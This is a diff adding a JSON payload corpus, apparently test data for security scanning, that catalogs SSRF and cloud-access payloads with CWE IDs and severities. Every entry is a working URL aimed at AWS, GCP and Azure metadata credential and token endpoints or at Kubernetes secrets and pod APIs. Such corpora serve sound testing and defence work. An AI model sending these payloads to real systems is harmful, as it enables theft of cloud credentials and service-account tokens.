@@ -1,0 +1,15 @@
+{
+  "schema": "12-schemas/payload.schema.json",
+  "corpus_id": "PL-CLOUD",
+  "version": "1.0.0",
+  "provenance": { "source": "PAT", "ref": "master@2026-01-15" },
+  "payloads": [
+    { "payload_id": "PL-CLOUD-0001", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "aws", "payload": "http://169.254.169.254/latest/user-data", "severity": "critical", "tags": ["metadata", "user-data", "credentials"], "classification": "T1" },
+    { "payload_id": "PL-CLOUD-0002", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "aws", "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "severity": "critical", "tags": ["metadata", "iam-credentials"], "classification": "T2" },
+    { "payload_id": "PL-CLOUD-0003", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "gcp", "payload": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "severity": "critical", "tags": ["metadata", "oauth-token"], "classification": "T2" },
+    { "payload_id": "PL-CLOUD-0004", "cwe_id": "CWE-918", "context": "url", "surface": "parameter", "engine": "azure", "payload": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "severity": "critical", "tags": ["metadata", "managed-identity"], "classification": "T2" },
+    { "payload_id": "PL-CLOUD-0010", "cwe_id": "CWE-200", "context": "url", "surface": "parameter", "engine": "k8s", "payload": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets", "severity": "critical", "tags": ["k8s", "service-account", "secrets"], "classification": "T2" },
+    { "payload_id": "PL-CLOUD-0011", "cwe_id": "CWE-200", "context": "url", "surface": "parameter", "engine": "k8s", "payload": "https://kubernetes.default.svc/api/v1/pods?fieldSelector=spec.nodeName=NODE", "severity": "high", "tags": ["k8s", "pods"], "classification": "T1" },
+    { "payload_id": "PL-CLOUD-0020", "cwe_id": "CWE-284", "context": "url", "surface": "parameter", "engine": "azure", "payload": "https://management.azure.com/subscriptions?api-version=2022-12-01", "severity": "high", "tags": ["azure", "enumeration"], "classification": "T1" }
+  ]
+}
